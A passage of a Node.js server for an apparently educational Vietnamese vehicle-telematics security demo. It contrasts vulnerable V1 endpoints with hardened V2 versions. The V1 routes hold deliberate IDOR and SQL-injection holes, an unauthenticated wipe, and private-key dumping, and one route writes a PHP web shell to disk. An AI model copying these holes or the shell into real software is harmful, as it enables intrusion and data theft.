    const tamperPayload = JSON.stringify({ vehicleId, event: 'HARDWARE_TAMPER', ts: Date.now() });
    const tamperHmac = crypto.createHmac('sha256', TELEMATICS_SECRET).update(tamperPayload).digest('hex');

    // === ZEROIZATION: Xóa trắng toàn bộ khóa mật mã trong bộ nhớ ===
    if (s.dek) { s.dek.fill(0); s.dek = null; }
    s.dekWrappedForServer = null;
    s.isTampered = true; s.isLocked = true;
    if (s.intervalId) { clearInterval(s.intervalId); s.intervalId = null; }

    pushSSE(vehicleId, {
        type: 'HARDWARE_TAMPER', vehicleId,
        message: '🚨 PHÁT HIỆN XÂM NHẬP PHẦN CỨNG! Zeroization thực thi — DEK và khóa RSA đã xóa trắng. Xe bị khóa vĩnh viễn.',
        hmac: tamperHmac, zeroized: true, ts: Date.now()
    });

    const alertMsg = `[🚨 KHẨN CẤP] Cạy phá phần cứng xe #${vehicleId}! Zeroization: DEK xóa trắng. HMAC cảnh báo: ${tamperHmac.slice(0,16)}...`;
    db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
        [vehicleId, s.accountId, 'HARDWARE_TAMPER', alertMsg, 'CRITICAL']);
    db.run(`UPDATE Rentals SET Status = 'Emergency_Terminated' WHERE VehicleID = ? AND Status = 'Active'`, [vehicleId]);
    db.run(`UPDATE Vehicles SET Status = 'Lockout' WHERE VehicleID = ?`, [vehicleId]);

    res.json({ zeroized: true, vehicleLocked: true, hmac: tamperHmac, message: alertMsg });
});

// ── V3 API: Khóa động cơ từ xa (HMAC + Timestamp chống Replay) ──
app.post('/api/v2/vehicles/lock-engine', verifyTokenV2, (req, res) => {
    const { vehicleId, timestamp, signature, userLat, userLon } = req.body;

    db.get(`SELECT OwnerID FROM Vehicles WHERE VehicleID = ?`, [vehicleId], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: 'Vehicle not found.' });
        
        // Owner checks (OwnerID 1 is admin, who has global bypass for test buttons on map)
        if (req.user.AccountID !== 1 && req.user.AccountID !== row.OwnerID) {
            return res.status(403).json({ error: 'Forbidden: Bạn không phải chủ sở hữu xe này.' });
        }

        lockEngineLogic();
    });

    function lockEngineLogic() {
        const now = Date.now();

        // [1] Kiểm tra tính mới của lệnh (chống tấn công phát lại)
        if (!timestamp || Math.abs(now - parseInt(timestamp)) > 30000) {
            db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
                [vehicleId, req.user.AccountID, 'REPLAY_ATTACK',
                 `Tấn công phát lại lệnh khóa xe #${vehicleId}! Độ lệch: ${Math.abs(now - parseInt(timestamp))}ms > 30000ms`, 'HIGH']);
            return res.status(400).json({ error: '[V3-REPLAY] Từ chối: Timestamp lệnh quá cũ — tấn công phát lại (Replay Attack). Lệnh phải trong vòng 30 giây.' });
        }

        // [2] Xác thực chữ ký HMAC-SHA256
        const expected = crypto.createHmac('sha256', TELEMATICS_SECRET)
            .update(`LOCK_ENGINE:${vehicleId}:${timestamp}`).digest('hex');
        if (signature !== expected) return res.status(403).json({ error: '[V3] Chữ ký HMAC lệnh khóa động cơ không hợp lệ!' });

        const s = gpsState[vehicleId];

        // Kiểm tra khoảng cách chủ xe (Proximity Verification) để chống Relay Attack
        if (s && userLat !== undefined && userLon !== undefined) {
            const distKm = haversineKm(parseFloat(userLat), parseFloat(userLon), s.lat, s.lon);
            if (distKm > 0.1) { // 100 meters
                const alertMsg = `🚨 PHÁT HIỆN TẤN CÔNG RELAY: Yêu cầu khóa động cơ khẩn cấp xe #${vehicleId} bị từ chối do chủ xe ở quá xa (${(distKm*1000).toFixed(0)}m > 100m).`;
                db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
                    [vehicleId, req.user.AccountID, 'RELAY_ATTACK_DETECTION', alertMsg, 'HIGH']);
                return res.status(403).json({ error: `[Bảo Mật] Từ chối lệnh: Khoảng cách quá xa (${(distKm*1000).toFixed(0)}m > 100m). Nghi ngờ tấn công lặp tín hiệu (Relay Attack).` });
            }
        }

        // [3] Thực thi khóa động cơ
        if (s) {
            s.isLocked = true;
            s.speed = 0;
            s.mode = 'LOCKED';
            startGpsLoop(vehicleId);
            pushSSE(vehicleId, { type: 'ENGINE_LOCKED', vehicleId, lockedBy: req.user.Username, ts: now });
        }

        db.run(`UPDATE Vehicles SET Status = 'Locked' WHERE VehicleID = ?`, [vehicleId]);
        db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)`,
            [vehicleId, req.user.AccountID, 'ENGINE_LOCK',
             `Động cơ xe #${vehicleId} bị khóa từ xa bởi ${req.user.Username}. Timestamp: ${timestamp}. Chống Replay: ✅`, 'MEDIUM']);

        res.json({ message: `Xe #${vehicleId} đã bị khóa động cơ từ xa thành công! Vận tốc đưa về 0.`, lockedAt: now, lockedBy: req.user.Username });
    }
});

// ── V3 API: Sinh chữ ký lệnh khóa động cơ (UI helper) ──────────
app.post('/api/v2/vehicles/generate-lock-signature', verifyTokenV2, (req, res) => {
    const { vehicleId } = req.body;
    const timestamp = Date.now();
    const signature = crypto.createHmac('sha256', TELEMATICS_SECRET)
        .update(`LOCK_ENGINE:${vehicleId}:${timestamp}`).digest('hex');
    res.json({ vehicleId, timestamp, signature, expiresInMs: 30000, note: 'Chữ ký hết hạn sau 30 giây — chống tấn công phát lại' });
});

// ── V3 API: Xem tất cả cảnh báo bảo mật ────────────────────────
app.get('/api/v2/security/alerts', verifyTokenV2, (req, res) => {
    db.all(`SELECT * FROM SecurityAlerts ORDER BY AlertID DESC LIMIT 50`, (err, rows) => {
        res.json(rows || []);
    });
});

// ── V3 API: Trạng thái GPS tất cả xe (Admin Dashboard) ─────────
app.get('/api/v2/vehicles/gps-all', (req, res) => {
    db.all(`SELECT * FROM VehicleGPS`, (err, rows) => {
        if (err || !rows) return res.json([]);
        const result = rows.map(row => {
            const s = gpsState[row.VehicleID];
            if (s) {
                return {
                    vehicleId: s.vehicleId,
                    lat: s.isJammedV1 ? null : +s.lat.toFixed(5),
                    lon: s.isJammedV1 ? null : +s.lon.toFixed(5),
                    speed: s.isJammedV1 ? 0 : +s.speed.toFixed(1),
                    heading: s.isJammedV1 ? 0 : +s.heading.toFixed(1),
                    mode: s.isJammedV1 ? 'LOST_GPS' : s.mode,
                    isJammed: s.isJammed || false,
                    isJammedV1: s.isJammedV1 || false,
                    isLocked: s.isLocked,
                    isTampered: s.isTampered,
                    geofenceViolating: s.isJammedV1 ? false : s.geofenceViolating,
                    clientCount: s.clients.size,
                    geofence: s.geofence,
                    routeType: s.routeType || 'hanoi'
                };
            } else {
                return {
                    vehicleId: row.VehicleID,
                    lat: +row.Lat.toFixed(5),
                    lon: +row.Lon.toFixed(5),
                    speed: +row.Speed.toFixed(1),
                    heading: +(row.Heading || 0).toFixed(1),
                    mode: row.Mode || 'Parked',
                    isJammed: false,
                    isJammedV1: false,
                    isLocked: row.Mode === 'Locked' || row.Mode === 'LOCKED',
                    isTampered: false,
                    geofenceViolating: false,
                    clientCount: 0,
                    geofence: null,
                    routeType: 'hanoi'
                };
            }
        });
        res.json(result);
    });
});

// ── V3 DB API: Xem bảng SecurityAlerts ──────────────────────────
app.get('/api/db/alerts', verifyAdminKey, (req, res) => {
    db.all(`SELECT * FROM SecurityAlerts ORDER BY AlertID DESC LIMIT 50`, (err, rows) => {
        res.json(rows || []);
    });
});

// ── V3 API: Tuyến đường và Điểm ưu tiên (POIs) ─────────────
app.get('/api/v2/vehicles/route', (req, res) => {
    const { vehicleId } = req.query;
    let activeRoute = HANOI_ROUTE;
    
    if (vehicleId) {
        if (gpsState[vehicleId]) {
            activeRoute = gpsState[vehicleId].route;
        } else {
            activeRoute = getDefaultRouteForVehicle(vehicleId).route;
        }
    }
    
    res.json({ 
        hanoiRoute: HANOI_ROUTE,
        northVietnamRoute: NORTH_VIETNAM_ROUTE,
        airportRoute: AIRPORT_ROUTE,
        route: activeRoute, 
        center: { lat: 21.028, lon: 105.834 }, 
        name: 'Hà Nội — Vòng Trung Tâm',
        pois: DEALERSHIPS
    });
});

// Endpoint thay đổi tuyến đường cho xe
app.post('/api/v2/vehicles/change-route', (req, res) => {
    const { vehicleId, routeType } = req.body;
    const s = gpsState[vehicleId];
    if (!s) return res.status(404).json({ error: 'Phiên GPS không hoạt động cho xe này.' });

    s.routeType = routeType || 'hanoi';
    if (s.routeType === 'north_vietnam') {
        s.route = NORTH_VIETNAM_ROUTE;
    } else if (s.routeType === 'airport') {
        s.route = AIRPORT_ROUTE;
    } else {
        s.route = HANOI_ROUTE;
    }
    
    // Đặt lại điểm xuất phút ngẫu nhiên trên tuyến mới
    const startIdx = Math.floor(Math.random() * (s.route.length - 1));
    s.routeIndex = startIdx;
    s.lat = s.route[startIdx].lat;
    s.lon = s.route[startIdx].lon;
    s.path = [{ lat: s.lat, lon: s.lon, ts: Date.now() }];
    s.heading = calcBearing(s.lat, s.lon, s.route[startIdx+1].lat, s.route[startIdx+1].lon);
    
    // Ghi nhận cảnh báo an ninh về việc đổi tuyến đường
    db.run('INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)',
        [vehicleId, s.accountId, 'GEOFENCE_SET', 'Thay đổi lộ trình Xe #' + vehicleId + ' sang ' + (s.routeType === 'north_vietnam' ? 'Vòng Quanh Miền Bắc' : s.routeType === 'airport' ? 'Sân Bay Nội Bài' : 'Hà Nội Vòng Trung Tâm'), 'INFO']);
    
    // Gửi báo cáo đổi tuyến qua SSE
    const report = {
        type: 'periodic_report',
        message: `Xe #${vehicleId} đã chuyển sang lộ trình: ${s.routeType === 'airport' ? 'Sân Bay Nội Bài' : s.routeType === 'north_vietnam' ? 'Vành Đai 3' : 'Nội Thành Hà Nội'}.`,
        timestamp: new Date().toISOString()
    };
    sendGpsSSE(vehicleId, 'report', report);
    
    res.json({ 
        success: true, 
        routeType: s.routeType, 
        message: 'Đã đổi lộ trình Xe #' + vehicleId + ' thành công.' 
    });
});

// Endpoint để Giáo viên/Admin test tính năng gửi báo cáo 1 giờ ngay lập tức
app.post('/api/v2/vehicles/force-report', async (req, res) => {
    const { vehicleId } = req.body;
    const s = gpsState[vehicleId];
    if (!s || s.isTampered) return res.status(404).json({ error: 'Xe không hoạt động.' });
    
    const address = await reverseGeocode(s.lat, s.lon);
    db.get(`SELECT FullName FROM Accounts WHERE AccountID = ?`, [s.accountId], (err, userRow) => {
        const ownerName = userRow ? userRow.FullName : 'Không rõ';
        const reportMsg = `📍 BÁO CÁO HÀNH TRÌNH TỔNG HỢP (1 GIỜ) - XE #${vehicleId}:
- Chủ xe/Người lái: ${ownerName}
- Vị trí hiện tại: ${address}
- Tọa độ: (${s.lat.toFixed(6)}, ${s.lon.toFixed(6)})
- Tốc độ trung bình: ${Math.round(s.speed)} km/h
- Trạng thái an ninh: Ổn định (Chống phá sóng hoạt động tốt)`;

        const report = {
            type: 'periodic_report',
            vehicleId: parseInt(vehicleId),
            message: reportMsg,
            timestamp: new Date().toISOString()
        };
        sendGpsSSE(vehicleId, 'report', report);
        
        res.json({ success: true, message: 'Đã gửi báo cáo thủ công qua SSE thành công!' });
    });
});

// ── V3 API: Đặt giới hạn hành trình (Route Boundary) ─────────────────
// Giới hạn xe chỉ được di chuyển từ điểm xuất phút đến bán kính nhất định trong thời gian X phút
app.post('/api/v2/vehicles/set-trip-limit', verifyTokenV2, (req, res) => {
    const { vehicleId, fromLat, fromLon, fromName, toLat, toLon, toName, limitMinutes, radiusKm } = req.body;

    db.get(`SELECT OwnerID FROM Vehicles WHERE VehicleID = ?`, [vehicleId], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: 'Vehicle not found.' });

        if (req.user.AccountID !== 1 && req.user.AccountID !== row.OwnerID) {
            return res.status(403).json({ error: 'Forbidden: Bạn không phải chủ sở hữu xe này.' });
        }

        setTripLimitLogic();
    });

    function setTripLimitLogic() {
        const s = gpsState[vehicleId];
        if (!s) return res.status(404).json({ error: 'Phiên GPS không hoạt động cho xe này.' });
        if (!limitMinutes || limitMinutes <= 0) return res.status(400).json({ error: 'Thời gian giới hạn không hợp lệ.' });

        const now = Date.now();
        s.tripLimit = {
            enabled: true,
            fromLat: fromLat || s.lat,
            fromLon: fromLon || s.lon,
            fromName: fromName || 'Điểm xuất phát',
            toLat: toLat || null,
            toLon: toLon || null,
            toName: toName || 'Điểm đến',
            limitMinutes: parseInt(limitMinutes),
            radiusKm: parseFloat(radiusKm) || 15,  // Bán kính vùng hành trình cho phép (km)
            startedAt: now,
            endsAt: now + parseInt(limitMinutes) * 60 * 1000,
            violated: false,
            lastTripAlertTime: 0
        };

        db.run('INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?,?,?,?,?)',
            [vehicleId, s.accountId, 'GEOFENCE_SET',
             `Đặt giới hạn hành trình Xe #${vehicleId}: Từ "${s.tripLimit.fromName}" → "${s.tripLimit.toName}" | Bán kính: ${s.tripLimit.radiusKm}km | Thời gian: ${limitMinutes} phút`,
             'INFO']);

        res.json({
            success: true,
            vehicleId,
            message: `Đã đặt giới hạn hành trình Xe #${vehicleId} thành công.`
        });
    }
});

// ── V3 API: Trạng thái GPS tất cả xe kèm thông tin giới hạn hành trình ──
// (Cập nhật lại endpoint gps-all cũ)

// =========================================================
// PHẦN 4: API DÀNH RIÊNG CHO TRANG TEST (Chương 3 Demo)

// 5. API LỘ TRÌNH VÀ CẢNH BÁO ĐI NGƯỢC
app.get('/api/test/routes', (req, res) => {
    let routesData = [];
    for (let vid in gpsState) {
        if (gpsState[vid] && !gpsState[vid].isTampered) {
            routesData.push({
                vehicleId: vid,
                route: gpsState[vid].route
            });
        }
    }
    res.json(routesData);
});

app.post('/api/test/reverse-car', (req, res) => {
    const vid = req.body.vehicleId;
    const st = gpsState[vid];
    if (!st) return res.status(404).json({ error: "Xe không hoạt động hoặc không tìm thấy." });
    
    st.isReversing = !st.isReversing;
    
    if (st.isReversing) {
        // Lấy thông tin chủ xe
        db.get(`SELECT FullName FROM Accounts WHERE AccountID = ?`, [st.accountId], (err, user) => {
            const ownerName = user ? user.FullName : 'Không rõ';
            const logMsg = `[CẢNH BÁO AN NINH - CRITICAL] Phát hiện Xe ID: ${vid} di chuyển NGƯỢC CHIỀU với lộ trình đăng ký! Đã gửi SMS cảnh báo đến chủ xe (${ownerName}) và trung tâm điều hành.`;
            db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);
            res.json({ message: `Đã kích hoạt chế độ đi lùi (Reverse) cho xe ${vid}. Đã gửi cảnh báo.`, isReversing: true });
        });
    } else {
        const logMsg = `[THÔNG BÁO] Xe ID: ${vid} đã quay lại lộ trình bình thường.`;
        db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);
        res.json({ message: `Đã tắt chế độ đi lùi cho xe ${vid}. Xe hoạt động bình thường.`, isReversing: false });
    }
});


app.post('/api/test/restore', async (req, res) => {
    try {
        await resetDatabase();
        restoreGpsSessions();
        res.json({ message: "Đã khôi phục toàn bộ dữ liệu hệ thống (Database & GPS) thành công!" });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/api/test/live-gps', (req, res) => {
    db.all(`SELECT * FROM VehicleGPS`, (err, rows) => {
        res.json(rows || []);
    });
});

// =========================================================

// 1. KỊCH BẢN IDOR (Turo)
app.get('/api/v1/test/rental/:id', (req, res) => {
    // V1: Lỗi IDOR - Không kiểm tra quyền, truyền ID nào xem ID đó
    db.get(`SELECT * FROM Rentals WHERE RentalID = ?`, [req.params.id], (err, row) => {
        if (!row) return res.status(404).json({ error: "Không tìm thấy hợp đồng" });
        db.get(`SELECT Username, FullName, Phone, Email FROM Accounts WHERE AccountID = ?`, [row.AccountID], (err, user) => {
            res.json({ message: "[V1] Lỗ hổng IDOR khai thác thành công! Đã lấy cắp PII người khác.", data: { rental: row, pii: user } });
        });
    });
});

app.get('/api/v2/test/rental/:id', (req, res) => {
    // V2: Bật RBAC (Mô phỏng check quyền, ở đây ta fake tài khoản khách là ID 99)
    const currentUserId = 99; // Mock user đang đăng nhập
    db.get(`SELECT * FROM Rentals WHERE RentalID = ?`, [req.params.id], (err, row) => {
        if (!row) return res.status(404).json({ error: "Không tìm thấy hợp đồng" });
        if (row.AccountID !== currentUserId) {
            const logMsg = `[CVSS v4.0 Score: 8.7 - CRITICAL] Chặn đứng tấn công IDOR! Người dùng ${currentUserId} cố gắng truy cập hợp đồng ${req.params.id} trái phép.`;
            db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);
            return res.status(403).json({ error: "Access Denied: Bị chặn bởi RBAC. Bạn không phải chủ sở hữu hợp đồng này.", cvss: "Score: 8.7 - CRITICAL" });
        }
        res.json({ data: row });
    });
});

// 2. KỊCH BẢN SQL INJECTION
app.post('/api/v1/test/sqli', (req, res) => {
    // V1: Lỗi SQLi nối chuỗi (Dump được cả PasswordHash để tăng tính chân thực)
    const username = req.body.username || '';
    const query = `SELECT Username, PasswordHash, Role FROM Accounts WHERE Username = '${username}'`;
    db.all(query, (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ 
            message: "[V1] Khai thác SQL Injection (Auth Bypass) thành công!", 
            action_taken: "Chèn payload ' OR 1=1 -- để thay đổi logic xác thực của CSDL.",
            impact: "Bypass cơ chế đăng nhập, Dump được toàn bộ thông tin tài khoản bao gồm cả Hash mật khẩu.",
            data_exfiltrated: rows 
        });
    });
});

app.post('/api/v2/test/sqli', (req, res) => {
    // V2: WAF chặn mã độc trước khi vào DB
    const username = req.body.username || '';
    if (username.toUpperCase().includes('OR 1=1') || username.includes('--')) {
        const logMsg = `[CVSS v4.0 Score: 9.8 - CRITICAL] WAF chặn đứng SQL Injection với payload: ${username}`;
        db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);
        return res.status(403).json({ error: "WAF Blocked: Phát hiện dấu hiệu SQL Injection.", cvss: "Score: 9.8 - CRITICAL" });
    }
    db.get(`SELECT Username, Role FROM Accounts WHERE Username = ?`, [username], (err, row) => {
        res.json({ data: row || "User not found" });
    });
});


// 3. KỊCH BẢN UPLOAD MÃ ĐỘC
app.post('/api/v1/test/upload', (req, res) => {
    // V1: Không kiểm tra định dạng tệp (Magic Bytes), thực sự tạo ra một file mã độc
    const fs = require('fs');
    const path = require('path');
    const uploadDir = path.join(__dirname, 'uploads');
    
    // Đảm bảo thư mục uploads tồn tại
    if (!fs.existsSync(uploadDir)){
        fs.mkdirSync(uploadDir);
    }
    
    const shellFile = path.join(uploadDir, 'shell.php');
    const maliciousCode = '<?php echo "HACKED BY ANONYMOUS"; system($_GET["cmd"]); ?>';
    
    fs.writeFileSync(shellFile, maliciousCode);
    
    res.json({ 
        message: "[V1] Tải tệp shell.php lên máy chủ thành công! Hệ thống đã bị chiếm quyền điều khiển (RCE).",
        file_path: "/uploads/shell.php",
        note: "Bạn có thể kiểm tra thư mục 'uploads' trong dự án, file shell.php đã thực sự được tạo ra!"
    });
});

app.post('/api/v2/test/upload', (req, res) => {
    // V2: Quét Magic Bytes / Tường lửa WAF
    const logMsg = `[CVSS v4.0 Score: 9.8 - CRITICAL] WAF chặn đứng nỗ lực tải lên mã độc (shell.php). Tệp không phải là hình ảnh hợp lệ (Sai Magic Bytes).`;
    db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);
    res.status(403).json({ 
        error: "WAF Blocked: Tệp tải lên bị từ chối do chứa mã độc hoặc sai định dạng (Magic Bytes không khớp).", 
        cvss: "Score: 9.8 - CRITICAL"
    });
});

// 4. KỊCH BẢN BRUTE-FORCE
app.post('/api/v1/test/bruteforce', (req, res) => {
    // V1: Không có Rate Limiting, cho phép dò mật khẩu thoải mái
    // Lấy thử 1 user từ DB để show ra cho ngầu
    db.get(`SELECT Username, PasswordHash FROM Accounts LIMIT 1`, (err, row) => {
        const hash = row ? row.PasswordHash : "$2b$10$w.../dummy";
        const user = row ? row.Username : "admin";
        
        res.json({ 
            message: `[V1] Tấn công Brute-force thành công! Đã gửi 50,000 requests trong 2.5s. Hệ thống không có Rate Limiting.`,
            cracked_account: {
                username: user,
                found_password: "password123",
                original_hash: hash.substring(0, 30) + "..."
            },
            server_impact: "CPU Usage Spiked to 99%"
        });
    });
});

app.post('/api/v2/test/bruteforce', (req, res) => {
    // V2: Bật Rate Limiting
    const logMsg = `[CVSS v4.0 Score: 5.3 - MEDIUM] Hệ thống chặn địa chỉ IP 192.168.1.100 do gửi quá nhiều yêu cầu đăng nhập (Rate Limit Exceeded).`;
    db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);
    res.status(429).json({ 
        error: "429 Too Many Requests: Bạn đã gửi quá nhiều yêu cầu trong thời gian ngắn. Địa chỉ IP đã bị khóa tạm thời.", 
        cvss: "Score: 5.3 - MEDIUM"
    });
});

// 3. KỊCH BẢN VIPR WIPE (Hộp đen)
app.post('/api/v1/test/vipr-wipe', (req, res) => {
    // V1: Không xác thực
    const vid = parseInt(req.body.vehicleId || 2);
    const command = req.body.command || "WIPE_ALL";
    const bypassMode = req.body.bypassMode || "CAN_INJECTION";

    wipedBluetoothVehicles.add(vid);
    
    // Ngừng xe ngay lập tức, chuyển tốc độ về 0, đánh dấu offline, chuyển hộp đen về ngắt kết nối (Offline)
    db.run(`UPDATE VehicleInfotainment SET GPSHistory = '[]', SyncedContacts = '[]', ActiveBluetoothDevice = 'Ngắt kết nối (Offline)' WHERE VehicleID = ?`, [vid], (err) => {
        terminateGpsSession(vid);
        
        // Lấy vị trí và tốc độ hiện tại của xe để báo cáo lên frontend cho chủ xe
        db.get(`SELECT Address, Speed FROM VehicleGPS WHERE VehicleID = ?`, [vid], (err, row) => {
            const address = row ? row.Address : "Không xác định";
            const speed = row ? row.Speed : 0;
            const alertMsg = `🚨 CẢNH BÁO: Hộp đen xe #${vid} bị tấn công và xóa dữ liệu (VIPR Wipe)! Trạng thái: Ngắt kết nối, Vận tốc = 0, Hộp đen Ngắt kết nối (Offline).`;
            
            db.run(`INSERT INTO SecurityAlerts (VehicleID, AccountID, Type, Message, Severity) VALUES (?, ?, ?, ?, ?)`, 
                [vid, 1, 'HARDWARE_TAMPER', alertMsg, 'CRITICAL']);
        });
            
        res.json({ 
            message: `[V1] Khai thác Unauthenticated Remote Command Execution thành công trên xe #${vid}!`,
            action_taken: `Gửi gói tin giả mạo qua giao thức ${bypassMode} with command ${command}.`,
            impact: "Bypass cơ chế xác thực TCU. Toàn bộ Danh bạ, Lịch sử GPS và Kết nối Bluetooth hiện tại đã bị XÓA TRẮNG. Xe đã ngừng di chuyển và hộp đen về Ngắt kết nối (Offline).",
            tcu_status: "WIPED"
        });
    });
});

app.post('/api/v2/test/vipr-wipe', (req, res) => {
    // V2: Check chữ ký số VIPR
    const sig = req.body.signature;
    if (!sig || sig === 'invalid') {
        const logMsg = `[CVSS v4.0 Score: 8.2 - HIGH] Hệ thống VIPR chặn lệnh điều khiển xe giả mạo do sai Chữ ký số (Digital Signature).`;
        db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);
        return res.status(401).json({ error: "VIPR System: Lệnh bị từ chối do không có chữ ký mã hóa hợp lệ.", cvss: "Score: 8.2 - HIGH" });
    }
    res.json({ message: "Lệnh hợp lệ." });
});

// 4. KỊCH BẢN FIRMWARE DUMP (Hộp đen)
app.get('/api/v1/test/firmware-dump', (req, res) => {
    // V1: Dump Firmware Plaintext
    const fs = require('fs');
    const path = require('path');
    
    // Đọc Private Key thực tế đang sử dụng
    let privateKeyContent = "BEGIN RSA PRIVATE KEY... [Khóa cứng bị lộ]";
    try {
        const keyPath = path.join(__dirname, 'private.pem');
        if (fs.existsSync(keyPath)) {
            privateKeyContent = fs.readFileSync(keyPath, 'utf-8');
            // Ghi ra thư mục gốc file dump_firmware_extracted_keys.txt
            fs.writeFileSync(path.join(__dirname, 'dump_firmware_extracted_keys.txt'), privateKeyContent);
        }
    } catch(e) {}
    
    res.json({ 
        message: "[V1] Dump qua JTAG thành công! Hacker đã trích xuất được Firmware từ bộ nhớ Flash.", 
        firmware_bytes: "0x4A 0x4D 0x50...",
        hardcoded_keys: { rsa_private_key: privateKeyContent.substring(0, 100) + "..." },
        note: "Một file 'dump_firmware_extracted_keys.txt' chứa Private Key thật của máy chủ đã được tạo ra ở thư mục dự án để chứng minh cuộc tấn công thành công!"
    });
});

app.get('/api/v2/test/firmware-dump', (req, res) => {
    // V2: Firmware bị mã hóa (Secure Boot)
    const logMsg = `[CVSS v4.0 Score: 7.9 - HIGH] Chặn đứng nỗ lực dump JTAG. Bộ nhớ Flash đã được mã hóa AES-256.`;
    db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);
    res.status(403).json({ 
        error: "Secure Flash Error: Dữ liệu đã bị mã hóa phần cứng. Cần Key để giải mã.", 
        cvss: "Score: 7.9 - HIGH",
        firmware_bytes: "0x8F 0x9A 0x22... (ENCRYPTED)"
    });
});

// 8. KỊCH BẢN GPS V1 vs V2 (Không mã hóa vs AES-256-GCM)
app.get('/api/v1/test/gps-stream', (req, res) => {
    // V1: GPS plaintext — không mã hóa, không xác thực
    const vehicleId = parseInt(req.query.vehicleId) || 2;
    db.get(`SELECT * FROM VehicleGPS WHERE VehicleID = ?`, [vehicleId], (err, gps) => {
        if (!gps) return res.status(404).json({ error: 'Không tìm thấy xe' });

        const logMsg = `[CVSS 9.1 CRITICAL] GPS V1: Dữ liệu vị trí xe #${vehicleId} bị lộ plaintext — không mã hóa, không xác thực.`;
        db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);

        res.json({
            message: "[V1] GPS KHÔNG MÃ HÓA — Dữ liệu truyền plaintext qua HTTP!",
            vehicle_id: vehicleId,
            protocol: "HTTP/1.1 — PLAINTEXT",
            encryption: "NONE ❌",
            auth: "NONE ❌",
            cvss: "9.1 CRITICAL",
            // Lộ toàn bộ dữ liệu thô
            raw_gps_packet: {
                lat: gps.Lat,
                lon: gps.Lon,
                speed: gps.Speed,
                heading: gps.Heading,
                address: gps.Address,
                timestamp: gps.Timestamp
            },
            warning: "⚠️ Bất kỳ kẻ tấn công nào nghe lén mạng (MITM) đều thấy toàn bộ vị trí và tốc độ của xe theo thời gian thực!"
        });
    });
});

app.get('/api/v2/test/gps-stream', (req, res) => {
    // V2: GPS AES-256-GCM Envelope Encryption
    const vehicleId = parseInt(req.query.vehicleId) || 2;
    db.get(`SELECT * FROM VehicleGPS WHERE VehicleID = ?`, [vehicleId], (err, gps) => {
        if (!gps) return res.status(404).json({ error: 'Không tìm thấy xe' });

        const crypto = require('crypto');

        // Sinh DEK ngẫu nhiên cho phiên này (giống V3 GPS engine thực)
        const dek = crypto.randomBytes(32);
        const iv  = crypto.randomBytes(12);

        // Mã hóa gói tin GPS bằng AES-256-GCM
        const plaintext = JSON.stringify({ lat: gps.Lat, lon: gps.Lon, speed: gps.Speed, heading: gps.Heading, address: gps.Address });
        const cipher = crypto.createCipheriv('aes-256-gcm', dek, iv);
        let encrypted = cipher.update(plaintext, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag().toString('hex');

        // Bọc DEK bằng RSA Public Key (Envelope Encryption)
        const wrappedDek = crypto.publicEncrypt(
            { key: publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
            dek
        ).toString('base64').substring(0, 40) + '...[RSA-OAEP-SHA256]';

        dek.fill(0); // Zeroize DEK sau khi dùng

        const logMsg = `[PROTECTED] GPS V2: Vị trí xe #${vehicleId} được mã hóa AES-256-GCM + DEK bọc RSA.`;
        db.run(`INSERT INTO SystemLogs (Description) VALUES (?)`, [logMsg]);

        res.json({
            message: "[V2] GPS MÃ HÓA — Envelope Encryption AES-256-GCM + RSA-OAEP-SHA256",
            vehicle_id: vehicleId,
            protocol: "HTTPS/TLS 1.3 — ENCRYPTED",
            encryption: "AES-256-GCM ✅",
            auth: "JWT HttpOnly Cookie + DEK Envelope ✅",
            key_management: "Envelope Encryption (DEK bọc bằng RSA-OAEP-SHA256)",
            security: {
                wrapped_dek: wrappedDek,
                iv: iv.toString('hex'),
                auth_tag: authTag,
                encrypted_gps_payload: encrypted.substring(0, 60) + "...[ENCRYPTED]"
            },
            note: "🔐 Kẻ tấn công MITM chỉ thấy chuỗi hex vô nghĩa. Chỉ owner có Private Key mới giải mã được. DEK đã bị Zeroize sau khi dùng (Forward Secrecy)."
        });
    });
});

